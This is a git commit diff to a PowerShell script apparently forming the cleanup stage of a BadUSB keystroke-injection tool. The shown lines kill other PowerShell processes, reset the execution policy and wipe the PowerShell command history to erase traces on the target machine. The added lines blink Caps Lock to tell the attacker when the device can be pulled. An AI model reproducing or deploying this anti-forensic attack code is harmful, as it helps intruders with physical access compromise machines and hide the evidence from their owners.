807d639ce863ed18b32188d155100750ed518664
thor <71063979+tuconnaisyouknow@users.noreply.github.com>
2023-10-10 12:59:32 +0200

    Correcting some bugs

--- storage/fin_storage.ps1
+++ storage/fin_storage.ps1
@@ -6,5 +6,14 @@
 #  |___/                                        
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
 Set-ExecutionPolicy restricted -Force #Reset script blocker
+#Enable and disable capslock to know when you can unplug BadUSB
+$keyBoardObject = New-Object -ComObject WScript.Shell
+$keyBoardObject.SendKeys("{CAPSLOCK}")
+Start-Sleep -Seconds 1 #Wait 2 seconds
+$keyBoardObject.SendKeys("{CAPSLOCK}")
+Start-Sleep -Seconds 1 #Wait 2 seconds
+$keyBoardObject.SendKeys("{CAPSLOCK}")
+Start-Sleep -Seconds 1 #Wait 2 seconds
+$keyBoardObject.SendKeys("{CAPSLOCK}")
 Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
 taskkill -F /IM powershell.exe #Kill all powershell process
